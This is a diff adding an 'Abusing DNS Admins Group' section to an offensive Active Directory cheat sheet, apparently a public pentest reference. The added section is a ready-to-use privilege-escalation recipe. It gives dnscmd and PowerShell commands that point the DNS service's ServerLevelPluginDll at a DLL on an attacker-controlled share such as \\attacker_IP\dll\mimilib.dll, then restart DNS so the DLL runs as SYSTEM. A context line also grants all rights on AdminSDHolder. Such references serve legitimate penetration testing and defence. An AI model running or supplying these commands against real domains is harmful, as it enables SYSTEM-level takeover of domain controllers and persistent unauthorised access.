@@ -84,6 +84,7 @@
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+    - [Abusing DNS Admins Group](#abusing-dns-admins-group)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
       - [GenericWrite](#genericwrite)
@@ -2581,6 +2582,39 @@ Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights R
 # Give all rights
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
 ```
+
+
+### Abusing DNS Admins Group
+
+> It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
+
+:warning: Require privileges to restart the DNS service.
+
+* Enumerate members of DNSAdmins group
+    ```ps1
+    Get-NetGroupMember -GroupName "DNSAdmins"
+    Get-ADGroupMember -Identity DNSAdmins
+    ```
+* Change dll loaded by the DNS service
+    ```ps1
+    # with RSAT
+    dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
+    dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll
+
+    # with DNSServer module
+    $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
+    $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
+    Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
+    ```
+* Check the previous command success
+    ```ps1
+    Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+    ```
+* Restart DNS
+    ```ps1
+    sc \\dc01 stop dns
+    sc \\dc01 start dns
+    ```
 
 
 ### Abusing Active Directory ACLs/ACEs
